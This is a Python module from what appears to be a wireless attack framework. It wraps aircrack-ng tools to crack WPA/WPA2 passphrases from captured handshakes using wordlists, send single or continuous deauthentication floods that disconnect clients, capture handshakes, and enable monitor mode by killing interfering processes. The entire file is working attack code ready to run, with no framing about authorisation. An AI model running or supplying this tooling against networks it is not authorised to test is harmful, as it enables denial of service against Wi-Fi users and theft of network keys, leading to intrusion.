"""
Aircrack-ng Integration
───────────────────────
WPA/WPA2 handshake cracking, WEP key recovery, and packet injection
via the aircrack-ng suite.

Supports:
  - WPA/WPA2 dictionary attack (aircrack-ng)
  - WEP cracking (aircrack-ng with captured IVs)
  - Deauth injection (aireplay-ng)
  - Packet capture (airodump-ng)
  - Monitor mode management (airmon-ng)
"""

import os
import re
import time
import signal
import subprocess
import tempfile
from typing import Optional, List, Dict, Tuple
from pathlib import Path

from posframework.config import log
from posframework.tools import is_available, which, run_tool, run_tool_background


# ─── Aircrack-ng WPA Cracker ─────────────────────────────────────────────────

class AircrackWPA:
    """
    Crack WPA/WPA2 handshakes using aircrack-ng with wordlists.

    Usage:
        cracker = AircrackWPA()
        result = cracker.crack("handshake.cap", bssid="AA:BB:CC:DD:EE:FF",
                               wordlist="/usr/share/wordlists/rockyou.txt")
        if result:
            print(f"Key found: {result}")
    """

    def __init__(self):
        if not is_available("aircrack-ng"):
            raise FileNotFoundError("aircrack-ng not installed")

    def crack(
        self,
        capture_file: str,
        bssid: Optional[str] = None,
        essid: Optional[str] = None,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        timeout: Optional[int] = None,
    ) -> Optional[str]:
        """
        Attempt to crack a WPA handshake with a wordlist.

        Args:
            capture_file: Path to .cap/.pcap file containing the handshake.
            bssid: Target AP BSSID (optional but recommended).
            essid: Target ESSID (optional).
            wordlist: Path to wordlist file.
            timeout: Max seconds to run (None = until complete).

        Returns:
            The cracked passphrase, or None if not found.
        """
        if not os.path.isfile(capture_file):
            log.error(f"Capture file not found: {capture_file}")
            return None

        if not os.path.isfile(wordlist):
            log.error(f"Wordlist not found: {wordlist}")
            return None

        args = [
            "-w", wordlist,
            "-l", "/dev/stdout",  # Output key to stdout
            "-q",  # Quiet mode
        ]

        if bssid:
            args.extend(["-b", bssid])
        if essid:
            args.extend(["-e", essid])

        args.append(capture_file)

        log.info(f"Cracking {capture_file} with wordlist {Path(wordlist).name}...")

        try:
            result = run_tool("aircrack-ng", args, timeout=timeout)

            # Parse output for the key
            output = result.stdout + result.stderr
            key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
            if key_match:
                key = key_match.group(1)
                log.critical(f"KEY FOUND: {key}")
                return key

            # Check if handshake was valid
            if "No valid WPA handshakes found" in output:
                log.warning("No valid WPA handshake in capture file")
            elif "Passphrase not in dictionary" in output:
                log.info("Passphrase not found in wordlist")

        except subprocess.TimeoutExpired:
            log.info(f"Crack attempt timed out after {timeout}s")
        except Exception as e:
            log.error(f"aircrack-ng error: {e}")

        return None

    def crack_multi_wordlist(
        self,
        capture_file: str,
        bssid: str,
        wordlists: List[str],
        timeout_per: int = 300,
    ) -> Optional[str]:
        """
        Try multiple wordlists sequentially until key is found.

        Args:
            capture_file: Path to capture file.
            bssid: Target BSSID.
            wordlists: List of wordlist file paths (tried in order).
            timeout_per: Timeout per wordlist attempt in seconds.

        Returns:
            The cracked passphrase, or None.
        """
        for wl in wordlists:
            if not os.path.isfile(wl):
                log.debug(f"Skipping missing wordlist: {wl}")
                continue
            log.info(f"Trying wordlist: {Path(wl).name}")
            result = self.crack(capture_file, bssid=bssid, wordlist=wl, timeout=timeout_per)
            if result:
                return result
        return None

    def check_handshake(self, capture_file: str, bssid: Optional[str] = None) -> bool:
        """
        Verify a capture file contains a valid WPA handshake.

        Returns:
            True if valid handshake found.
        """
        args = ["-a", "2"]  # WPA mode
        if bssid:
            args.extend(["-b", bssid])
        args.extend(["-w", "/dev/null", capture_file])  # Empty wordlist, just check

        try:
            result = run_tool("aircrack-ng", args, timeout=10)
            output = result.stdout + result.stderr
            return "1 handshake" in output or "valid handshake" in output.lower()
        except Exception:
            return False


# ─── Aireplay-ng Injection ────────────────────────────────────────────────────

class AireplayDeauth:
    """
    Deauthentication via aireplay-ng (uses standard aircrack-ng suite).

    Useful as a fallback when native deauth or scapy injection fails
    on certain drivers that support aireplay better.
    """

    def __init__(self, interface: str):
        if not is_available("aireplay-ng"):
            raise FileNotFoundError("aireplay-ng not installed")
        self.interface = interface
        self._proc: Optional[subprocess.Popen] = None

    def deauth(
        self,
        bssid: str,
        client: Optional[str] = None,
        count: int = 10,
        timeout: int = 30,
    ) -> bool:
        """
        Send deauth frames via aireplay-ng.

        Args:
            bssid: Target AP BSSID.
            client: Target client MAC (None = broadcast).
            count: Number of deauth packets (0 = continuous).
            timeout: Max seconds to run.

        Returns:
            True if injection succeeded.
        """
        args = [
            "--deauth", str(count),
            "-a", bssid,
        ]
        if client:
            args.extend(["-c", client])
        args.append(self.interface)

        try:
            result = run_tool("aireplay-ng", args, timeout=timeout)
            output = result.stdout + result.stderr
            # Check for successful injection
            if "Sending" in output or "DeAuth" in output:
                return True
            if "No such BSSID" in output:
                log.warning(f"aireplay: BSSID {bssid} not found on channel")
        except subprocess.TimeoutExpired:
            pass  # Expected for count=0
        except Exception as e:
            log.error(f"aireplay-ng error: {e}")

        return False

    def deauth_continuous(self, bssid: str, client: Optional[str] = None) -> bool:
        """Start continuous deauth in background. Call stop() to terminate."""
        path = which("aireplay-ng")
        if not path:
            return False

        args = [path, "--deauth", "0", "-a", bssid]
        if client:
            args.extend(["-c", client])
        args.append(self.interface)

        self._proc = subprocess.Popen(
            args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        log.info(f"aireplay deauth started (pid={self._proc.pid})")
        return True

    def stop(self):
        """Stop continuous deauth."""
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGTERM)
                self._proc.wait(timeout=5)
            except (subprocess.TimeoutExpired, OSError):
                self._proc.kill()
            self._proc = None


# ─── Airodump Capture ─────────────────────────────────────────────────────────

class AirodumpCapture:
    """
    Capture packets via airodump-ng for handshake collection.

    Writes .cap files compatible with aircrack-ng and hashcat.
    """

    def __init__(self, interface: str):
        if not is_available("airodump-ng"):
            raise FileNotFoundError("airodump-ng not installed")
        self.interface = interface
        self._proc: Optional[subprocess.Popen] = None
        self._output_prefix: Optional[str] = None

    def start_capture(
        self,
        bssid: Optional[str] = None,
        channel: Optional[int] = None,
        output_prefix: Optional[str] = None,
    ) -> str:
        """
        Start airodump-ng capture in background.

        Args:
            bssid: Filter to specific BSSID.
            channel: Lock to specific channel.
            output_prefix: Output file prefix (auto-generated if None).

        Returns:
            Output file prefix path.
        """
        if output_prefix is None:
            output_prefix = os.path.join(
                tempfile.gettempdir(),
                f"posfw_capture_{int(time.time())}"
            )

        self._output_prefix = output_prefix
        path = which("airodump-ng")

        args = [path, "--write", output_prefix, "--output-format", "pcap"]
        if bssid:
            args.extend(["--bssid", bssid])
        if channel:
            args.extend(["--channel", str(channel)])
        args.append(self.interface)

        self._proc = subprocess.Popen(
            args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        log.info(f"airodump capture started → {output_prefix}-01.cap")
        return output_prefix

    def stop_capture(self) -> Optional[str]:
        """
        Stop capture and return the .cap file path.

        Returns:
            Path to the capture file, or None.
        """
        if self._proc:
            try:
                self._proc.send_signal(signal.SIGTERM)
                self._proc.wait(timeout=5)
            except (subprocess.TimeoutExpired, OSError):
                self._proc.kill()
            self._proc = None

        # airodump appends -01.cap
        cap_file = f"{self._output_prefix}-01.cap"
        if os.path.isfile(cap_file):
            return cap_file
        return None

    def get_capture_file(self) -> Optional[str]:
        """Return the current capture file path."""
        if self._output_prefix:
            cap = f"{self._output_prefix}-01.cap"
            return cap if os.path.isfile(cap) else None
        return None


# ─── Airmon-ng Monitor Mode ───────────────────────────────────────────────────

def airmon_start(interface: str) -> Optional[str]:
    """
    Enable monitor mode via airmon-ng.

    Args:
        interface: Wireless interface name (e.g., 'wlan0').

    Returns:
        Monitor interface name (e.g., 'wlan0mon'), or None on failure.
    """
    if not is_available("airmon-ng"):
        return None

    # Kill interfering processes first
    try:
        run_tool("airmon-ng", ["check", "kill"], timeout=10)
    except Exception:
        pass

    try:
        result = run_tool("airmon-ng", ["start", interface], timeout=15)
        output = result.stdout + result.stderr

        # Parse output for the monitor interface name
        # Common patterns: "monitor mode vif enabled on wlan0mon"
        #                  "(monitor mode enabled on mon0)"
        mon_match = re.search(
            r"(?:enabled|enabled on|created)\s+(\w+mon\w*|\w+)", output
        )
        if mon_match:
            mon_iface = mon_match.group(1)
            log.info(f"Monitor mode enabled: {interface} → {mon_iface}")
            return mon_iface

        # Fallback: assume interface + "mon"
        mon_iface = interface + "mon"
        log.info(f"Monitor mode enabled (assumed): {mon_iface}")
        return mon_iface

    except Exception as e:
        log.error(f"airmon-ng start failed: {e}")
        return None


def airmon_stop(interface: str) -> bool:
    """
    Disable monitor mode via airmon-ng.

    Args:
        interface: Monitor interface name (e.g., 'wlan0mon').

    Returns:
        True on success.
    """
    if not is_available("airmon-ng"):
        return False

    try:
        run_tool("airmon-ng", ["stop", interface], timeout=15)
        log.info(f"Monitor mode disabled: {interface}")
        return True
    except Exception as e:
        log.error(f"airmon-ng stop failed: {e}")
        return False
